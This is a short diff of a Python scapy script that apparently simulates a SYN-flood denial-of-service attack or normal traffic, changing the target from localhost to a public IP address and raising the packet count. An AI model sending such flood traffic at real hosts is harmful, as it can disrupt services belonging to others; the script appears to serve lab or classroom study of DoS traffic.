@@ -1,9 +1,9 @@
 import random
 from scapy.all import IP, TCP, send, time
 
-target_ip = 'localhost' # target ip
-dest_port = 80          # target port
-num_packets = 10        # number of packets to send to target ip
+target_ip = '20.163.104.229' # target ip
+dest_port = 80               # target port
+num_packets = 100            # number of packets to send to target ip
 
 def send_syn_packet(target_ip):
     # random source port
@@ -63,7 +63,7 @@ if __name__=="__main__":
     while(True):
         print("Enter \"0\" to begin simulating a DOS attack OR")
         print("Enter \"1\" to simulate normal traffic")
-        mode = input()
+        mode = int(input())
         print()
 
         if mode:
